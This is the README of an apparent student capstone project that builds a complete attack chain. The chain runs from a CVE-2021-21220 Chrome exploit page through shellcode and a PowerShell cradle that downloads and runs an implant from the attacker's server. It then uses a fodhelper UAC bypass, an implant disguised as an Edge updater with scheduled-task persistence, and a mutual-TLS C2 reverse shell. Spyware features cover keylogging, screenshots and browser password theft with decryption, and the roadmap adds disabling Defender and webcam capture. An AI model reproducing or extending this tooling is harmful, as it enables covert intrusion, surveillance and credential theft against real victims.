# Capstone Docker Lab — Milestone 2


## Exploit Plan

The victim browses to a hosted webpage. The exploit initiates via shellcode embedded in `utils.js` (runs client-side in the victim's browser via CVE-2021-21220). The shellcode runs on the victim's machine, calls the HTTPS delivery server, downloads `MicrosoftEdgeUpdate.exe`, and executes it — all without visible windows. Once running, the implant enrolls with the C2 server over one-way TLS to receive a signed certificate, then reconnects over full mutual TLS. The C2 controller receives the connection and presents an interactive reverse-shell menu, allowing the operator to run Windows commands remotely on the victim's machine.

---

## Project Structure

```
/ (workspace root)
├── docker-compose.yml              # Starts c2-server + exfil-server on shared labnet bridge
├── launch.sh                       # One-command setup: generates tokens + PKI, builds shellcode, starts lab
├── .env                            # Generated by launch.sh — gitignored (C2_HOST_IP, DOWNLOAD_TOKEN, ENROLLMENT_TOKEN)
├── .gitignore                      # Excludes .env, certs/, implant_certs.h, binaries
├── README.md                       # This file
├── vuln.md                         # Security analysis: vulnerabilities, detections, mitigations, best practices
├── spyware.md                      # Feature roadmap for spyware capabilities
│
├── certs/                          # Generated by launch.sh — gitignored, never committed
│   ├── generate_certs.sh           # PKI generation: CA, controller cert, nginx cert; writes implant_certs.h
│   ├── ca.key                      # Offline CA private key (4096-bit RSA) — used by controller to sign enrollment CSRs
│   ├── ca.crt                      # Offline CA certificate — embedded in implant binary and loaded by controller
│   ├── controller.{key,crt}        # Controller TLS identity (365-day, CN=controller, CA-signed)
│   ├── nginx.{key,crt}             # nginx self-signed cert with SAN=IP:<HOST_IP> (port 443)
│   └── whitelist.txt               # Implant cert serial numbers for BP4 revocation — populated at enrollment
│
├── c2-server/
│   ├── Dockerfile                  # Builds controller binary; copies certs/ + ca.key into image at build time
│   └── C2-Server-and-Implant/
│       ├── Makefile                # Linux controller + Windows implant; -mwindows; accepts C2_HOST_IP + ENROLLMENT_TOKEN
│       ├── src/
│       │   ├── controller.c        # C2 server: TLS accept, enrollment handling, whitelist check, command dispatch
│       │   ├── implant.c           # Windows implant: BP2 enrollment, mTLS connect, keepalive thread, command handlers
│       │   ├── spyware.c           # Implant: Modular keylogger, screenshot capture, and browser exfiltration
│       │   ├── spyware_controller.c # Controller: Handlers for saving exfiltrated spyware data
│       │   ├── protocol.c          # Packet framing: SSL_write/SSL_read, 512-byte secure padding
│       │   ├── tls.c               # All OpenSSL logic: contexts, enrollment, CSR signing, whitelist check
│       │   ├── implant_utils.c     # secure_jitter_sec(), file exfil utilities (DPAPI + plain)
│       │   └── controller_utils.c  # flush_stdin()
│       └── include/
│           ├── spyware.h           # Declarations for implant-side spyware features
│           ├── spyware_controller.h # Declarations for controller-side spyware handlers
│           ├── tls.h               # Conn struct + full TLS API (init, wrap, enroll, sign, whitelist)
│           ├── protocol.h          # Packet struct, Command enum (ENROLL_CSR, ENROLL_CERT, SCREENSHOT, etc.)
│           ├── platform.h          # SLEEP, CLOSE_SOCKET, hidden_popen (CREATE_NO_WINDOW), secure_random, threading
│           ├── implant_utils.h     # Shared file utility declarations
│           ├── implant_certs.h     # Generated: CA cert only as C byte array (implant cert/key issued at runtime)
│           └── controller_utils.h  # flush_stdin() declaration
│
├── exfil-server/
│   ├── Dockerfile                  # 3-stage: cross-compile OpenSSL → build implant.exe → nginx + node runtime
│   ├── shellcode-generation/
│   │   ├── src/stager.asm          # Flat x64 NASM shellcode: PEB walk → WinExec(powershell HTTPS download + UAC bypass)
│   │   ├── bin/                    # Build output — pre-built by launch.sh, copied into Docker build context
│   │   └── Makefile                # Substitutes HOST_IP + DOWNLOAD_TOKEN into stager, assembles with nasm
│   ├── exploit-contents/
│   │   ├── index.html              # CVE-2021-21220 exploit webpage
│   │   ├── utils.js                # V8 type confusion exploit (shellcode array patched at Docker build time)
│   │   ├── server.js               # Node.js static file server (port 8888) with request logging
│   │   └── token_server.js         # Single-use DOWNLOAD_TOKEN server (localhost:3000, proxied by nginx)
│   └── web-server/
│       └── nginx.conf              # TLS 1.2+1.3 on port 443; access_log → stdout; proxies /update/ to token_server
│
├── utils-scripts/                  # Post-exfiltration analysis tools
│   ├── decrypt_creds.py            # Decrypts exfiltrated Edge/Chrome Master Keys and Login Data
│   └── read_history.py             # Parses exfiltrated Edge/Chrome History SQLite databases
│
└── exfil-data/                     # Persisted volume — one sub-folder per implant: exfil-data/<hostname>-<ip>/
    └── <hostname>-<ip>/            # Created automatically on first command; contains screenshots, keylogs, databases
```

> `.env` and `certs/` are **never committed** — both are created fresh by `launch.sh` on every run.

---

## Tokens and Cryptography — How It All Works

This section covers every token and cryptographic operation in the pipeline in the order they are created and consumed.

### 1. PKI Bootstrap — The Offline CA

`launch.sh` calls `certs/generate_certs.sh`, which creates a private Certificate Authority from scratch on every run:

```
openssl genrsa -out ca.key 4096
openssl req -x509 -new -key ca.key -sha256 -days 365 -out ca.crt -subj "/CN=LabCA"
```

`ca.key` and `ca.crt` are the root of trust for the entire pipeline. Nothing is trusted unless it was signed by this CA. Because they are regenerated each `launch.sh` run, there is no persistent PKI to steal.

**`ca.crt` is embedded in the implant binary** via `implant_certs.h` (a C byte array). The implant uses it to verify the controller's TLS certificate during enrollment and normal operation. **`ca.key` lives only inside the `c2-server` Docker container** — the controller uses it at runtime to sign enrollment CSRs.

### 2. The Enrollment Token (`ENROLLMENT_TOKEN`)

**What it is:** A random 16-byte (32 hex character) string, e.g. `a3f8c12e9b074d5e...`

**Generated by** `launch.sh`:
```bash
ENROLLMENT_TOKEN=$(openssl rand -hex 16)
```
`openssl rand` reads from the OS CSPRNG (Linux: `/dev/urandom`). This is cryptographically unpredictable.

**Where it goes:**
- Written to `.env`
- Baked into the Windows implant binary at compile time via `-DENROLLMENT_TOKEN="a3f8c12e..."` (a preprocessor macro in `implant.c`)
- Passed to the `c2-server` container as an environment variable (`ENROLLMENT_TOKEN=...` in docker-compose)

**How it is used — the enrollment handshake (first run only):**

```
Implant (Windows)                         Controller (Docker)
─────────────────                         ──────────────────
Check C:\Users\Public\MicrosoftEdge\ec.dat
  → not found, proceed with enrollment
tls_init_client_enroll(ca_cert)  ─────→   tls_init_server (SSL_VERIFY_PEER, no FAIL_IF_NO_PEER_CERT)
Generate 2048-bit RSA keypair in memory
Build CSR with CN = ENROLLMENT_TOKEN
tls_client_wrap_enroll (one-way TLS)  ──→  SSL_accept → sees no client cert → enrollment path
Send COMMAND_ENROLL_CSR (CSR bytes)   ──→  Parse CSR
                                           Verify CSR self-signature
                                           Extract CN, compare to getenv("ENROLLMENT_TOKEN")
                                           If match: sign 30-day cert, append serial to whitelist.txt
                                           Mark token as consumed (g_token_used = 1)
                                           Note: controller allows re-enrollment for lab reliability
Receive COMMAND_ENROLL_CERT           ←──  Send signed cert PEM
Encrypt via DPAPI (CryptProtectData)
Write cert PEM → C:\Users\Public\MicrosoftEdge\ec.dat
Write key  PEM → C:\Users\Public\MicrosoftEdge\ek.dat
tls_cleanup(); tls_init_client_mem(
  ca_cert, issued_cert, in_memory_key)
```

**Subsequent runs (reboot / scheduled task restart):**

```
Implant (Windows)
─────────────────
Check C:\Users\Public\MicrosoftEdge\ec.dat → found
Read DPAPI-encrypted cert from ec.dat → CryptUnprotectData
Read DPAPI-encrypted key from ek.dat  → CryptUnprotectData
tls_cert_signed_by_ca(cert, ca_cert)
  → valid: skip enrollment, connect directly over mTLS
  → invalid (CA rotated): delete ec.dat + ek.dat, re-enroll
```

The single-use token is consumed after first run, but the controller permits re-enrollment to "unstick" implants that lose their credentials. Subsequent restarts load credentials from the shared `C:\Users\Public` path, allowing the `SYSTEM` persistence task to use the same certificates generated during the initial user enrollment.

**Security properties:**
- The token is single-use but recoverable: enrollment is protected by the `ENROLLMENT_TOKEN` secret.
- The private key is generated at runtime and **never embedded in the binary**.
- Credential files are stored in `C:\Users\Public\MicrosoftEdge\`, a path accessible across User and SYSTEM contexts.
- **DPAPI Encryption:** Files on disk are encrypted via `CryptProtectData`, tying them to the victim machine and providing protection against offline extraction.
- `COMMAND_SHUTDOWN` deletes `ec.dat` and `ek.dat` — no credentials survive after the operator removes the implant.

### 2a. Credential Storage — DPAPI Protected

After enrollment, `implant.c` writes the cert and key as encrypted blobs:

```
cert blob → C:\Users\Public\MicrosoftEdge\ec.dat
key  blob → C:\Users\Public\MicrosoftEdge\ek.dat
```

On the next startup, both files are read and decrypted using `CryptUnprotectData`.

**Storage approach trade-offs:**

| Approach | What a defender finds | Portability |
|---|---|---|
| Plain PEM | Raw PEM text — readable with any text editor | Portable — file can be copied to another machine |
| DPAPI blob (current) | Binary ciphertext — no PEM headers | **Tied to original Windows machine** |

The DPAPI approach ensures that even if an analyst captures the `.dat` files, they cannot decrypt the private key without access to the victim machine's cryptographic context. Using `C:\Users\Public` instead of `%APPDATA%` ensures the credentials remain available when the implant transitions from a User process to a `SYSTEM` scheduled task.

### 3. The Download Token (`DOWNLOAD_TOKEN`)

**What it is:** A random 32-byte (64 hex character) string, e.g. `cdef06db2e4c43e1...`

**Generated by** `launch.sh`:
```bash
DOWNLOAD_TOKEN=$(openssl rand -hex 32)
```

**Where it goes:**
- Written to `.env`
- Baked into `stager.asm` at build time by the shellcode Makefile (substituted with `sed` into the PowerShell command URL)
- Passed to the `exfil-server` container as a runtime environment variable (so `token_server.js` can read it)

**How it is used:**

The shellcode runs this PowerShell command (simplified):
```powershell
(New-Object Net.WebClient).DownloadFile(
  'https://<HOST_IP>/update/cdef06db2e4c43e1...',
  'C:\Users\Public\i.exe'
)
```

nginx proxies `/update/<token>` to `token_server.js` on `localhost:3000`. The token server:
1. Receives the request and extracts the token from the URL path
2. Compares it to `DOWNLOAD_TOKEN` using a **constant-time comparison loop** (prevents timing oracle attacks where an attacker could determine partial token values by measuring response latency)
3. If valid and not yet consumed: sets `token_valid = false` immediately (before streaming), then serves `MicrosoftEdgeUpdate.exe`
4. If invalid or already consumed: returns `404`

**Security properties:**
- 64 hex characters = 256 bits of entropy — brute-forcing is computationally infeasible
- Single-use: token is burned on first valid download, so sandbox re-downloads and analyst URL extraction both get `404`
- Constant-time comparison prevents timing side-channels

### 4. The Controller Certificate (mTLS — Server Side)

`generate_certs.sh` creates the controller's TLS identity:
```bash
openssl genrsa -out controller.key 2048
openssl req -new -key controller.key -subj "/CN=controller" -out controller.csr
openssl x509 -req -in controller.csr -CA ca.crt -CAkey ca.key -days 365 -out controller.crt
```

The controller presents `controller.crt` during every TLS handshake. The implant verifies it against the embedded `ca.crt`. If the signature does not match (wrong CA, expired, tampered), the implant drops the connection — it will not talk to a rogue server.

### 5. The Implant Certificate (mTLS — Client Side, Runtime-Issued)

Unlike the controller cert, the implant cert **does not exist before the implant runs**. It is issued dynamically during enrollment (see §2 above). Key properties of the issued cert:

| Field | Value |
|---|---|
| Subject CN | The enrollment token (validated, then used as identity) |
| Validity | 30 days from enrollment time |
| Serial | 64-bit cryptographically random (`BN_rand`) |
| Signed by | `ca.key` (inside the controller container) |
| Private key | RSA-2048, generated in memory, never touches disk |

After enrollment, the controller appends the cert's serial number (hex) to `certs/whitelist.txt`. Every subsequent mTLS connection from the implant triggers a whitelist check: the controller reads the connecting cert's serial and searches the file. If the serial is not listed, the connection is rejected. This is the **BP4 revocation mechanism**.

### 6. The Full mTLS Handshake (Post-Enrollment)

After enrollment the implant calls `tls_init_client_mem(ca_cert, issued_cert, in_memory_key)` and reconnects. The TLS 1.3 handshake then performs mutual authentication:

```
Implant                                  Controller
───────                                  ──────────
ClientHello (TLS 1.3)              ──→
                                   ←──  ServerHello + Certificate (controller.crt)
                                         CertificateRequest
Verify controller.crt against ca.crt
Certificate (issued_cert)          ──→  Verify issued_cert against ca.crt
CertificateVerify (RSA-2048 sig)   ──→  Check serial in whitelist.txt
Finished                           ──→
                                   ←──  Finished
═══ TLS 1.3 session established (AES-256-GCM, ECDHE) ═══
```

**What TLS 1.3 with AES-GCM provides:**
- **Confidentiality:** All C2 traffic (commands, responses, file contents) is encrypted with AES-256-GCM. A network observer sees only ciphertext.
- **Integrity:** GCM is an authenticated encryption mode — any tampering with ciphertext is detected and the connection is dropped.
- **Forward secrecy:** ECDHE key exchange means session keys are ephemeral. Capturing the long-term cert private key does not decrypt past sessions.
- **Mutual authentication:** Both sides prove they hold a private key corresponding to a CA-signed certificate. Neither side accepts an unauthenticated peer.

### 7. Traffic Shaping (BP5)

Even with mTLS, a network observer can do **traffic analysis** — inferring operator activity from packet sizes and timing even without reading the content.

**Padding:** Every packet (in `protocol.c`) is padded with `secure_random` bytes to the next 512-byte boundary. A 6-byte `HEARTBEAT` response and a 4096-byte file read response are indistinguishable in size.

**Keepalive:** A background thread in the implant sends `COMMAND_KEEPALIVE` packets at random 20–40 second intervals (jittered with `BCryptGenRandom`). The controller discards them silently. The TCP flow looks identical whether the operator is idle or actively issuing commands.

---

## Payload Flow (End to End)

```
1. launch.sh
   ├── Generate DOWNLOAD_TOKEN (openssl rand -hex 32)
   ├── Generate ENROLLMENT_TOKEN (openssl rand -hex 16)
   ├── Generate PKI: ca.key + ca.crt, controller.{key,crt}, nginx.{key,crt}
   ├── Write implant_certs.h (ca.crt as C byte array)
   ├── Build shellcode: bake HOST_IP + DOWNLOAD_TOKEN into stager.asm → final_shellcode.bin
   └── docker compose up --build
       ├── exfil-server: cross-compile OpenSSL → build implant.exe (bakes ca.crt + HOST_IP + ENROLLMENT_TOKEN)
       └── c2-server: compile controller (loads certs from disk), copy ca.key into container

2. Victim browses to http://<HOST_IP>:8888
   └── utils.js fires CVE-2021-21220 (V8 type confusion)
       └── Shellcode runs in Chrome's RWX WASM page (no VirtualAlloc needed)

3. Shellcode → WinExec(powershell -w h -nop -c "...")
   ├── [Net.ServicePointManager]::SecurityProtocol = Tls12     ← force TLS 1.2 for .NET WebClient
   ├── ServerCertificateValidationCallback = {$true}           ← bypass self-signed nginx cert
   ├── DownloadFile('https://<HOST_IP>:8443/update/<DOWNLOAD_TOKEN>', 'C:\Users\Public\i.exe')
   │   └── nginx → token_server.js: constant-time compare → burn token → serve MicrosoftEdgeUpdate.exe
   ├── Write HKCU ms-settings fodhelper registry key → i.exe
   ├── Start fodhelper.exe (auto-elevates, runs i.exe as Administrator)
   └── Remove registry key (cleanup)

4. i.exe (implant) starts at high-integrity — no console window (-mwindows)
   │
   ├── [Self-relocation — first run only]
   │   ├── GetModuleFileName → currently C:\Users\Public\i.exe (not the install path)
   │   ├── CreateDirectory C:\Program Files (x86)\Microsoft\EdgeUpdate\
   │   ├── CopyFile → MicrosoftEdgeUpdate.exe
   │   ├── CreateProcess("MicrosoftEdgeUpdate.exe --relocated", CREATE_NO_WINDOW)
   │   └── Exit — i.exe process terminates and becomes deletable
   │
   ├── [Relocated copy starts with --relocated arg]
   │   └── DeleteFile(C:\Users\Public\i.exe) — staging copy removed
   │
   ├── [First run] C:\Users\Public\MicrosoftEdge\ec.dat not found → enrollment:
   │   ├── Generate RSA-2048 keypair (EVP in memory)
   │   ├── Build CSR with CN = ENROLLMENT_TOKEN
   │   ├── Connect to <HOST_IP>:443 — one-way TLS (no client cert)
   │   ├── Send COMMAND_ENROLL_CSR (CSR bytes)
   │   │   └── Controller: verify CSR sig, validate CN == ENROLLMENT_TOKEN,
   │   │       sign 30-day cert, append serial to whitelist.txt, burn token
   │   ├── Receive COMMAND_ENROLL_CERT (signed cert PEM)
   │   ├── CryptProtectData(cert) → ec.dat, CryptProtectData(key) → ek.dat
   │   └── Reinit TLS with issued cert + in-memory key (tls_init_client_mem)
   │
   └── [Subsequent runs — reboot / scheduled task] ec.dat found → skip enrollment:
       ├── Already at install path → self_relocate() is a no-op
       ├── CryptUnprotectData(ec.dat) → cert PEM
       ├── CryptUnprotectData(ek.dat) → key PEM
       └── tls_init_client_mem directly — no enrollment connection needed

5. Implant reconnects — full mTLS
   ├── TLS 1.3 handshake: mutual cert verification (both against ca.crt)
   ├── Controller checks implant cert serial against whitelist.txt
   ├── Implant sends COMMAND_HELLO (OS info)
   └── Controller auto-checks persistence, presents command menu

6. Operator: sudo docker attach c2-server
   └── Interactive menu: HEARTBEAT, RUN_CMD, READ_DATA, WRITE_DATA, SET_SLEEP, SHUTDOWN, ENABLE PERSISTENCE, SCREENSHOT, etc.
```

---

## What Each Container Does

### c2-server

- Built with `libssl-dev`; controller binary compiled against system OpenSSL (Linux)
- Runs: `./bin/linux/controller` — interactive terminal menu
- On startup: loads `certs/controller.crt`, `certs/controller.key`, `certs/ca.crt`, `certs/ca.key` from within the image
- On enrollment connection (no client cert): validates CSR → signs cert → writes serial to whitelist → burns token
- On normal mTLS connection: verifies cert chain → whitelist check → HELLO → command loop
- Exposed port: `443` (TCP, TLS 1.3 — blends with normal HTTPS traffic)
- **Persistent exfil volume:** mounted at `/opt/c2/exfil-data`; each implant's data is isolated in its own sub-folder `exfil-data/<hostname>-<ip>/` created automatically on first interaction.

### exfil-server

Built in **3 stages:**

| Stage | Name | What it does |
|---|---|---|
| 1 | `openssl-win` | Cross-compiles OpenSSL 3.0.9 static libs for Windows (mingw64, ~5 min, cached) |
| 2 | `builder` | Builds `implant.exe` fresh; patches shellcode array into `utils.js`; renames to `MicrosoftEdgeUpdate.exe` |
| 3 | runtime | nginx (port 443) + token_server (localhost:3000) + exploit site (port 8888) |

Exposed ports: `8443` (nginx HTTPS implant delivery), `8888` (CVE exploit page)

---

## Implant Name Obfuscation

The stager runs at **medium integrity** (browser renderer process) and cannot write to `C:\Program Files (x86)`. The implant handles its own relocation after the fodhelper UAC bypass elevates it to **high integrity**:

| Step | Path | Actor |
|---|---|---|
| Download | `C:\Users\Public\i.exe` | PowerShell stager (medium integrity) |
| Run | `i.exe` launched by fodhelper as Administrator | fodhelper UAC bypass |
| Relocate | Copy self → `C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe` | `i.exe` (high integrity) |
| Re-launch | `MicrosoftEdgeUpdate.exe --relocated` (CREATE_NO_WINDOW) | `i.exe` |
| Cleanup | `DeleteFile(C:\Users\Public\i.exe)` | relocated copy |
| Persist | Scheduled task points to the install path | operator via ENABLE PERSISTENCE |
| Shutdown | `MoveFileExA(..., MOVEFILE_DELAY_UNTIL_REBOOT)` marks install exe for deletion | SHUTDOWN command |

---

## Cryptographic Security Summary

| Best Practice | Implementation |
|---|---|
| **BP1** — mTLS with authenticated encryption | TLS 1.3 (AES-256-GCM + ECDHE), mutual cert auth, both sides verified against private CA |
| **BP2** — Enrollment on first contact | Implant carries only CA cert + enrollment token; RSA-2048 keypair generated at runtime; cert issued by controller; private key never on disk |
| **BP3** — CSPRNG for all randomness | `BCryptGenRandom` (Windows), `/dev/urandom` (Linux), `openssl rand` (shell) — no `rand()`/`srand()` anywhere |
| **BP4** — Key lifecycle | Implant cert expires in 30 days; serial whitelist allows instant revocation; whitelist populated at enrollment, not build time |
| **BP5** — Traffic metadata mitigation | 512-byte packet padding (hides payload size); random-interval keepalive (hides operator activity timing) |

---

## C2 Controller — Concurrent Multi-Implant UI

The controller now manages up to 8 simultaneous implant sessions. A background acceptor thread handles all incoming connections (enrollment, HELLO, persistence detection) while the operator UI runs on the main thread. The operator first selects which implant to task, then enters that implant's command loop.

### Step 1 — Session selection

When you attach to the container (`sudo docker attach c2-server`) you see the live implant list:

```
+------------------------------------------------------------------+
| C2 Controller — Connected Implants                               |
+------------------------------------------------------------------+
  ID    IP Address        OS | Hostname             Persistence
  ----  ----------------  ----------------------------  -----------
  [1]   192.168.1.50      Windows 10.0 | DESKTOP-A1B2  DISABLED
  [2]   192.168.1.75      Windows 10.0 | DESKTOP-C3D4  ENABLED
  [0] Refresh
Select implant>
```

Enter the implant number to enter its command loop, or `0` to refresh the list.

### Step 2 — Command loop for the selected implant

```
+------------------------------------+
| C2 Controller                      |
| Persistence: DISABLED              |
+------------------------------------+
Select a command:
  0 - BACK                       Return to implant list
  1 - HEARTBEAT                  Check implant is alive
  2 - SET_SLEEP                  Make implant sleep N seconds
  3 - SHUTDOWN    (removes implant + task)
  4 - READ_DATA                  Read a file from the target
  5 - WRITE_DATA                 Write a file to the target
  6 - RUN_CMD                    Execute a shell command
  7 - ENABLE PERSISTENCE         Create scheduled task on target
  8 - SCREENSHOT                 Capture victim screen
  9 - CLIPBOARD_GET              Capture clipboard text
 10 - KEYLOG_START               Start keylogger
 11 - KEYLOG_STOP                Stop keylogger
 12 - KEYLOG_DUMP                Dump keylog
 13 - CRED_STEAL                 Harvest browser credentials
 14 - HISTORY_STEAL              Harvest browser history
>
```

| Command | What happens |
|---|---|
| BACK | Returns to the session selection list; selected implant stays connected |
| HEARTBEAT | Controller sends ping; implant responds `ALIVE` over mTLS |
| SET_SLEEP | Implant sleeps N seconds then reconnects; session slot is released and the implant reappears as a new session after waking |
| SHUTDOWN | Implant deletes scheduled task + executable + credentials and exits; only the selected implant is affected — controller and other sessions remain alive |
| READ_DATA | Reads a file path on the target; returns up to 4096 bytes |
| WRITE_DATA | Writes arbitrary data to a file path on the target |
| RUN_CMD | Runs a shell command via `CreateProcess(CREATE_NO_WINDOW)` |
| ENABLE PERSISTENCE | Creates `schtasks` entry `MicrosoftEdgeUpdate` |
| SCREENSHOT | Captures full desktop; saved to `exfil-data/screenshot_<time>.bmp` |
| CLIPBOARD_GET | Retrieves current clipboard text |
| KEYLOG_START | Starts background keylogger thread (GetAsyncKeyState polling) |
| KEYLOG_STOP | Stops the keylogger thread |
| KEYLOG_DUMP | Retrieves recorded keystrokes; saved to `exfil-data/keylog_<time>.txt` |
| CRED_STEAL | Decrypts Edge/Chrome Master Key, copies Login Data; saved to `exfil-data/` |
| HISTORY_STEAL | Copies Edge/Chrome History database; saved to `exfil-data/` |

---

## 🛠 Advanced Spyware & Remote Access (Roadmap)

The project is architected for modular expansion. Planned features include:
* **Remote Input Control:** Controlling the victim's mouse and keyboard via `SendInput`.
* **Media Surveillance:** Activating the camera and microphone for live exfiltration.
* **Defensive Evasion:** Automated disabling of Windows Defender and anti-sandbox checks.
* **WiFi Harvesting:** Stealing saved network passwords.

See `spyware.md` for the full technical roadmap.

---

## Post-Exfiltration Analysis

Captured browser data can be analyzed using the scripts in `utils-scripts/`.

### 1. Decrypt Credentials
Decrypts saved passwords from exfiltrated `Login Data` and `master.key` files. Requires `pycryptodome`.
```bash
pip install pycryptodome
python3 utils-scripts/decrypt_creds.py
```

### 2. Read Browsing History
Parses exfiltrated `History` SQLite databases and displays recent activity with readable timestamps.
```bash
python3 utils-scripts/read_history.py
```

---

## Prerequisites

`launch.sh` checks for all of these and exits with a clear message if any are missing:

| Tool | Purpose | Install |
|---|---|---|
| `docker` + compose plugin | Container runtime | Official Docker docs |
| `make` | Build orchestration | `sudo apt install build-essential` |
| `nasm` | Assemble shellcode | `sudo apt install nasm` |
| `x86_64-w64-mingw32-gcc` | Cross-compile Windows implant | `sudo apt install gcc-mingw-w64-x86-64` |
| `openssl` | Generate PKI + tokens | `sudo apt install openssl` |
| `python3` | Generate `implant_certs.h` | `sudo apt install python3` |

---

## Usage

```bash
cd "/home/hero/Documents/CS 564/Docker/Docker-Lab-Milestone-2"
sudo ./launch.sh
```

### Useful commands

```bash
# Monitor all logs (nginx + token_server + exploit page)
sudo docker logs -f exfil-server

# Attach to the C2 controller interactive menu
sudo docker attach c2-server
# Detach without stopping: Ctrl+P then Ctrl+Q

# Shell into a container for debugging
sudo docker exec -it c2-server /bin/bash
sudo docker exec -it exfil-server /bin/bash
```

---

## Bugs Fixed / Features Added

| # | File(s) | Problem / Feature | Fix / Implementation |
|---|---|---|---|
| 16 | `spyware.c`, `spyware.h` | Lack of spyware capabilities | Implemented modular screenshot, keylogger, and clipboard features |
| 17 | `implant_utils.c` | Non-modular file utilities | Moved DPAPI and plain file reading to `implant_utils.c` for shared use |
| 18 | `controller.c`, `spyware_controller.c` | Monolithic controller code | Refactored exfil handlers into modular `spyware_controller.c` |
| 19 | `docker-compose.yml` | Screenshots not persisted | Added `exfil-data` volume mount to `c2-server` |
| 20 | `Makefile` | Missing library links | Added `-lgdi32 -luser32` for screenshot and keylogger support |
| 21 | `decrypt_creds.py`, `read_history.py` | Data analysis overhead | Added automated scripts to decrypt passwords and parse history |
| 22 | `spyware.c` | Compilation error | Fixed `#ifdef` logic and header include order in modular spyware source |
| 23 | `spyware.c` | Limited browser support | Expanded `CRED_STEAL` and `HISTORY_STEAL` to target both Edge and Chrome |
| 24 | `controller.c` | Single-implant limitation | Rewrote controller with background `acceptor_thread` and `Session` table (up to 8 slots); operator selects implant by number from a live session list; each implant is fully independent |
| 25 | `controller.c` | C2 output buffered on `docker attach` | Added `setvbuf(stdout, NULL, _IONBF, 0)` at startup — stdout is fully unbuffered so the session list and prompts appear immediately regardless of when the operator attaches |
| 26 | `token_server.js` | Single-use download token blocked N-victim delivery | Removed burn-after-first-use logic; `DOWNLOAD_TOKEN` now authenticates any number of downloads so multiple victims can retrieve the implant from the same running server |
| 27 | `implant_utils.c` | Session list missing hostname | Added `GetComputerNameA` call on Windows so the HELLO payload includes the machine hostname; session list now shows `OS version \| Hostname` and `IP Address` as labeled columns |
| 28 | `controller.c` | Acceptor thread debug output polluted operator terminal | Removed all stdout prints from `acceptor_thread`; it now runs fully silently — new implants appear in the session list on next refresh with no interleaved noise |
| 29 | `controller.c` | BACK closed the implant connection and caused a phantom reconnect | Added `back` flag to `run_command_loop`; session slot and TLS connection are only freed on a real disconnect (SET_SLEEP, SHUTDOWN, dropped connection) — BACK returns to the list with the session still live |
| 30 | `spyware_controller.c`, `spyware_controller.h`, `controller.c` | All implants wrote exfil files into the same flat directory | Each session now saves to `exfil-data/<hostname>-<ip>/`; directory is created on first command loop entry via `ensure_save_dir()`; all four handlers (screenshot, keylog, cred, history) write into the per-implant folder |
